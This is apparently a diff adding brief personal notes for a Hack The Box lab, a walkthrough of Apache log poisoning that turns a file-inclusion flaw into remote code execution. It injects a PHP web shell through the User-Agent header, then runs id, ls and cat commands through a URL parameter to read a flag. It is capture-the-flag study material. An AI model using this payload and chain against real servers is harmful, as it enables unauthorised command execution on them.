@@ -1,0 +1,12 @@
+Web RCE
+Apache Log Poisoning
+HTB Apache2 Log Poisoning RCE
+Run Burpsuite
+Go to 134.122.103.40:30061/index.php?language=/var/log/apache2/access.log and check if logs can view
+send to repeater
+User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/102.0
+134.122.103.40:30061/index.php?language=/var/log/apache2/access.log&cmd=id
+Check burpsuite response if uid shows
+Try 134.122.103.40:30061/index.php?language=/var/log/apache2/access.log&cmd=ls /
+ls / must be in URL encoded form ls%20%2f
+cat%20%2fc85ee5082f4c723ace6c0796e3a3db09.txt to get flag
